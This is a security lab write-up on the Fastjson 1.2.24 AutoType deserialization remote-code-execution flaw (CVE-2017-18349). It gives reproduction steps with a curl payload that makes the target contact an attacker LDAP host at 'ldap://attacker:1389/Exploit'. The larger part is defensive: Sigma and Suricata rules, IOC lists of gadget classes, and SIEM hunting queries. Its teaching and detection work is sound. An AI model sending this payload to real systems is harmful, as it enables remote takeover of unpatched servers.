# CVE-2017-18349 — Fastjson 1.2.24 Deserialization RCE via AutoType

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE ID | CVE-2017-18349 |
| CVSS | 9.8 (Critical) |
| Affected | Fastjson ≤ 1.2.24 (AutoType enabled by default) |
| Type | Remote Code Execution via Deserialization + JNDI Injection |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell) |

Fastjson is Alibaba's high-performance JSON parser for Java, widely used in Chinese enterprise applications. Version 1.2.24 and below enables `AutoType` by default, allowing JSON input to specify arbitrary Java classes via the `@type` field. An attacker can instantiate dangerous classes like `JdbcRowSetImpl` to trigger JNDI lookups, leading to remote code execution.

This vulnerability spawned a long series of bypass/patch cycles (1.2.25→1.2.83), making Fastjson one of the most persistently exploited Java libraries in Chinese security ecosystems.

## 2. Reproduction Steps

**Environment**: Spring Boot app with Fastjson 1.2.24, JDK 8u102 — via vulhub `fastjson/1.2.24-rce`.

**Attack Chain**:

```
┌──────────┐  POST JSON {"@type":"JdbcRowSetImpl"...}  ┌──────────────┐
│ Attacker │ ────────────────────────────────────────► │ Fastjson App │
└──────────┘                                           │   (8090)     │
                                                       └──────┬───────┘
  1. Fastjson parses @type → instantiates JdbcRowSetImpl      │
  2. setAutoCommit(true) → triggers JNDI lookup                │
     ├── LDAP://attacker:1389/Exploit                          │
     │   └── Returns reference → http://attacker:8888/         │
     └── GET /Exploit.class → loads & executes static block    │
  3. Runtime.exec("id") → root                                 │
```

**Steps**:
1. Start target: `docker compose up -d` (app on :8090)
2. Start LDAP+HTTP server: `python3 ldap_server.py` (reuse from Log4Shell lab)
3. Send payload:
```bash
curl --noproxy '*' -X POST http://target:8090/ \
  -H "Content-Type: application/json" \
  -d '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}'
```
4. Verify: `docker exec <container> cat /tmp/pwned.txt` → `uid=0(root)`

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

1. **Upgrade Fastjson** to 1.2.83+ or migrate to Fastjson2 / Jackson / Gson
2. **Disable AutoType explicitly**: `ParserConfig.getGlobalInstance().setAutoTypeSupport(false)`
3. **Use SafeMode** (Fastjson 1.2.68+): `ParserConfig.getGlobalInstance().setSafeMode(true)` — disables all AutoType
4. **Maintain a class blacklist**: Fastjson has internal blacklists, but keep them updated
5. **Input validation**: Reject JSON with `@type` field at the API gateway/WAF level
6. **Network egress filtering**: Block outbound LDAP/RMI/DNS from application servers
7. **Upgrade JDK** to 8u191+ (disables remote codebase loading)
8. **Dependency audit**: Scan for transitive Fastjson dependencies in all Java projects
9. **Use allowlist mode**: If AutoType is needed, explicitly whitelist allowed classes

### 3.2 Detection (Narrative)

**WAF / API Gateway**:
Inspect JSON POST bodies for the `@type` field. In most legitimate applications, `@type` is not used in client-submitted JSON. Block or alert on JSON containing `"@type"` combined with known dangerous class names (JdbcRowSetImpl, TemplatesImpl, BasicDataSource, JndiObjectFactory).

**Application Monitoring**:
Fastjson logs AutoType class instantiation at DEBUG level. Monitor for instantiation of classes in `com.sun.rowset`, `javax.naming`, `org.apache.commons` packages from user-controlled input.

**Network Detection**:
Same as Log4Shell — outbound LDAP/RMI/DNS from Java applications to external IPs indicates JNDI exploitation regardless of the trigger vulnerability.

### 3.3 Threat Hunting (Narrative)

**HTTP Traffic**:
- Search POST request bodies for `"@type"` combined with dangerous class names
- Look for 500 errors following POST requests with JSON bodies (failed exploitation attempts)
- Check for sequential pattern: POST with `@type` → outbound LDAP/RMI → class download

**Known Dangerous Classes** (Fastjson gadget chains):
- `com.sun.rowset.JdbcRowSetImpl` (JNDI via dataSourceName)
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` (bytecode execution)
- `org.apache.commons.dbcp.BasicDataSource` (classloader manipulation)
- `com.mchange.v2.c3p0.JndiRefForwardingDataSource` (JNDI)
- `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory` (JNDI)
- `org.springframework.beans.factory.config.PropertyPathFactoryBean` (Spring chain)

### 3.4 SOC Artifacts

#### 3.4.1 Sigma Rule — Fastjson AutoType Exploitation in HTTP

```yaml
title: Fastjson AutoType Deserialization Attack Attempt
id: e5f7a9b1-4c6d-8e0f-2a3b-5c7d9e1f3a5b
status: stable
level: critical
description: >
  Detects Fastjson deserialization attacks by matching @type field with known
  dangerous Java classes in HTTP POST request bodies.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-18349
  - https://github.com/alibaba/fastjson/wiki/security_update_20170315
author: Security Lab
date: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059.004
  - cve.2017.18349
logsource:
  category: webserver
detection:
  selection_method:
    cs-method: 'POST'
  selection_body:
    request_body|contains:
      - '"@type":"com.sun.rowset.JdbcRowSetImpl"'
      - '"@type":"com.sun.org.apache.xalan'
      - '"@type":"org.apache.commons.dbcp'
      - '"@type":"com.mchange.v2.c3p0'
      - '"@type":"org.apache.ibatis.datasource.jndi'
  condition: selection_method and selection_body
falsepositives:
  - Security scanners testing for Fastjson vulnerabilities
```

#### 3.4.2 Suricata Rules

```
# Fastjson AutoType @type with JdbcRowSetImpl in HTTP POST Body
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Fastjson AutoType JdbcRowSetImpl RCE (CVE-2017-18349)";
  flow:established,to_server;
  content:"POST"; http_method;
  content:"@type"; http_client_body; fast_pattern;
  content:"JdbcRowSetImpl"; http_client_body; distance:0;
  reference:cve,2017-18349;
  classtype:attempted-admin;
  sid:2017018349;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2017-18349;
)

# Fastjson AutoType @type with TemplatesImpl (bytecode gadget)
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Fastjson AutoType TemplatesImpl RCE";
  flow:established,to_server;
  content:"POST"; http_method;
  content:"@type"; http_client_body; fast_pattern;
  content:"TemplatesImpl"; http_client_body; distance:0;
  reference:cve,2017-18349;
  classtype:attempted-admin;
  sid:2017018350;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2017-18349;
)

# Fastjson AutoType with JNDI dataSourceName
alert http $EXTERNAL_NET any -> $HOME_NET any (
  msg:"ET EXPLOIT Fastjson JNDI Injection via dataSourceName";
  flow:established,to_server;
  content:"POST"; http_method;
  content:"@type"; http_client_body;
  content:"dataSourceName"; http_client_body; distance:0;
  content:"ldap://"; http_client_body; distance:0;
  reference:cve,2017-18349;
  classtype:attempted-admin;
  sid:2017018351;
  rev:1;
  metadata:attack_target Server, deployment Perimeter, tag CVE-2017-18349;
)
```

#### 3.4.3 Structured IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| Pattern (Body) | `"@type":"com.sun.rowset.JdbcRowSetImpl"` | Critical | Primary gadget chain |
| Pattern (Body) | `"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"` | Critical | Bytecode gadget |
| Pattern (Body) | `"@type":"org.apache.commons.dbcp.BasicDataSource"` | High | BCEL classloader |
| Pattern (Body) | `"@type":"com.mchange.v2.c3p0` | High | C3P0 JNDI chain |
| Pattern (Body) | `"dataSourceName":"ldap://` or `rmi://` | Critical | JNDI callback URL |
| Pattern (Body) | `"_bytecodes"` + `"_outputProperties"` | Critical | TemplatesImpl bytecode injection |
| Network | Outbound LDAP/RMI from Java app after POST | Critical | JNDI exploitation callback |
| Network | HTTP GET *.class from external IP | High | Remote classloading |
| Process | java → bash/sh/curl/wget | Critical | Post-exploitation |
| Library | fastjson ≤ 1.2.24 | Critical | AutoType enabled by default |
| Library | fastjson 1.2.25–1.2.47 | High | Blacklist bypass possible |
| Library | fastjson 1.2.48–1.2.67 | Medium | Requires specific conditions |
| Library | fastjson 1.2.68–1.2.82 | Low | expectClass bypass only |

#### 3.4.4 SIEM Hunting Queries

**Splunk SPL — Detect Fastjson @type Exploitation**:

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  method=POST
| where match(request_body, "(?i)\"@type\"\s*:\s*\"com\.(sun|mchange)|org\.(apache|spring)")
| stats count values(request_body) as payloads by src_ip, uri, status
| sort -count
| table src_ip uri status count payloads
```

**Splunk SPL — Fastjson 500 Errors (Failed Exploitation)**:

```spl
index=web sourcetype=access_combined method=POST status=500
  content_type="application/json"
| where match(request_body, "(?i)@type")
| stats count by src_ip, uri, _time
| where count > 3
| table src_ip uri count _time
```

**Microsoft Sentinel KQL — Fastjson AutoType Attack**:

```kql
CommonSecurityLog
| where RequestMethod == "POST"
    and RequestBody has "@type"
    and (RequestBody has "JdbcRowSetImpl"
         or RequestBody has "TemplatesImpl"
         or RequestBody has "BasicDataSource"
         or RequestBody has "c3p0")
| project TimeGenerated, SourceIP, RequestURL, RequestBody, 
    DeviceAction, Activity
| sort by TimeGenerated desc
```

**Microsoft Sentinel KQL — Java JNDI Callback After Fastjson POST**:

```kql
DeviceNetworkEvents
| where InitiatingProcessFileName == "java"
    and RemotePort in (1389, 1099, 8888)
    and ActionType == "ConnectionSuccess"
| join kind=inner (
    CommonSecurityLog
    | where RequestMethod == "POST" and RequestBody has "@type"
    | project PostTime=TimeGenerated, SourceIP
) on $left.DeviceId == $right.DeviceId
| where Timestamp between (PostTime .. (PostTime + 5s))
| project Timestamp, DeviceName, RemoteIP, RemotePort, 
    InitiatingProcessCommandLine
```

## 4. References

- [NVD CVE-2017-18349](https://nvd.nist.gov/vuln/detail/CVE-2017-18349)
- [Fastjson Security Updates (Alibaba)](https://github.com/alibaba/fastjson/wiki/security_update_20170315)
- [Fastjson Gadget Chains Summary](https://github.com/safe6Sec/Fastjson)
- [Fastjson Blacklist History](https://github.com/LeadroyaL/fastjson-blacklist)
- [CNCERT Fastjson Advisory (CN)](https://www.cnvd.org.cn/flaw/show/CNVD-2017-02833)
